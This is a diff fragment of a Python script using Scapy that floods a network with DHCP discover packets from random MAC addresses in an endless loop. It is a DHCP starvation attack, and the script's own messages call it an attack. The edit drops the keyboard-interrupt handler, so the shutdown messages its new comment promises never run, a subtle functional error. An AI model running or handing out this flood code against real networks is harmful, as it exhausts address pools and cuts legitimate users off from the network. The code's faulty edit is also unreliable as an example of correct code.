@@ -26,11 +26,11 @@ dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff',src=RandMAC())  \
                      /DHCP(options=[('message-type','discover'),('end')])
 
 
-try:
-    #Send packet out of eth0 and loop the packet
-    sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)
-    
-except KeyboardInterrupt:
-    print("\n\n\033[1;31mStopping the attack!\033[0m")
-    print("\n\033[1mShutting down safely...\033[0m")
-    print("\n\033[1;32mThank you!\033[0m")
+
+#Send packet out of eth0 and loop the packet
+sendp(dhcp_discover,iface='eth0',loop=1,verbose=1)
+
+#Display a message after the user stops the attack
+print("\n\n\033[1;31mStopping the attack!\033[0m")
+print("\n\033[1mShutting down safely...\033[0m")
+print("\n\033[1;32mThank you!\033[0m")
